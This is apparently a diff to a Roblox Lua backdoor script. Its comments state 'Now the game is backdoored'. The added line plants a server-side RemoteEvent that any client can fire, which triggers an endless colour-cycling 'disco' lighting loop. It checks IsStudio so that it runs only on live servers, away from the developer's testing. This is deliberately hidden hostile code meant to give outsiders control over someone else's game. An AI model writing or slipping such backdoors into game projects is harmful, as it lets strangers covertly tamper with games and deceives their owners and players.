@@ -3,3 +3,5 @@ if not game:GetService('RunService'):IsStudio() then local ReplicatedStorage, Ru
 -- make it a Script not a LocalScript, ModuleScripts etc
 -- Now the game is backdoored
 -- Updated so that it uses is not instudio method
+--Seperate Script for disco
+if not game:GetService('RunService'):IsStudio() then local R=game:GetService('ReplicatedStorage');local c=Instance.new('RemoteEvent',R)c.Name='culEvent5' R:WaitForChild('culEvent5').OnServerEvent:Connect(function()local L=game:GetService("Lighting");local e=Instance.new("ColorCorrectionEffect",L)function f(X)return math.acos(math.cos(X*math.pi))/math.pi end;local g=0;L.TimeOfDay="15:00";while wait(0.01)do e.TintColor=Color3.fromHSV(f(g),1,1)L.Ambient=Color3.fromHSV(f(g),1,1)g+=0.01 end end)end
